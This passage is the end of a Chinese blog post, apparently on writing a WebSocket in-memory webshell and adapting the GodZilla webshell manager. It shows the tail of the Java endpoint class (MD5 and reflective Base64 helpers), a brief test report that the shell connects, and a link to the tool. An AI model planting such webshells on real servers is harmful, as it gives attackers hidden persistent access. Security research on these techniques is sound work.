</span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, javax.websocket.CloseReason closeReason)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onclose method is invoked\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable thr)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onerror method is invoked\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            MessageDigest m;  </span><br><span class="line">            m = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);  </span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());  </span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> ret;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>基本没问题，除了进入shell会有一会延迟，这个是为了确保获取基础信息时能读到完整数据，避免只读取一部分数据从无法解析基础信息进而无法进入shell。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153025466.png"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153036197.png"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153053566.png"></p>
<p>最后项目地址：<a target="_blank" rel="noopener" href="https://github.com/Cmisl/WebSocketGodZilla">Cmisl&#x2F;WebSocketGodZilla: 实现了WebSocket通信的哥斯拉webshell管理器</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">WebSocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerEndpoint%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">ServerEndpoint注解实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javax-websocket-Endpoint%E7%BB%A7%E6%89%BF%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">javax.websocket.Endpoint继承实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">初始化流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">连接流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ServerEndpointConfig%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">构造ServerEndpointConfig实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96WsServerContainer"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">获取WsServerContainer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">编写内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BA%8C%E5%BC%80"><span class="toc-number">1.3.</span> <span class="toc-text">工具二开</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSocket%E9%80%9A%E4%BF%A1%E7%B1%BB"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">WebSocket通信类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">小马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">Base64类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Raw%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">Raw类型</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">测试</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&text=WebSocket内存马及GodZilla二次开发"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&is_video=false&description=WebSocket内存马及GodZilla二次开发"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebSocket内存马及GodZilla二次开发&body=Check out this article: http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&name=WebSocket内存马及GodZilla二次开发&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&t=WebSocket内存马及GodZilla二次开发"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
